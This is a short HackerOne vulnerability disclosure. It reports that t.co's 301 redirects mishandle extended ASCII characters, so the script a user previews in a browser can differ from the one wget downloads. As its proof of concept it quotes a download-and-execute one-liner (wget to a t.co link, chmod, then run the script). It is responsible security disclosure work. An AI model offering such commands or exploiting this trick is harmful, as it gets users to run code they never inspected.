# HackerOne Report: Bad extended ascii handling in HTTP 301 redirects of t.co
**Report ID:** 34084
**Vulnerability Class:** Open Redirect

## Vulnerability Information & PoC
This proof of concept is conceived and tested on Linux+bash (because I'm an user), and of course is harmless.

Imagine a tweet or a line in a tutorial that look like this : 
`wget http://t.co/abP2XEsm82 -O cafe.sh && chmod +x cafe.sh && ./cafe.sh`
Of course, you'll test the link in a browser to see if the script downloaded is harmless. It's the case. So you copy/paste the whole command in bash and execute it. And here is the issue, because the script previewed and the one downloaded are different.

All the details of the issue are in the script downloaded. I think the correction is easy enough (change the padding of the extended ascii char), but the possibilities of phishing with this bug are big.

Anyway, I'm available if you have any question, @Cqoicebordel or here.

## Discussion & Remediation Timeline
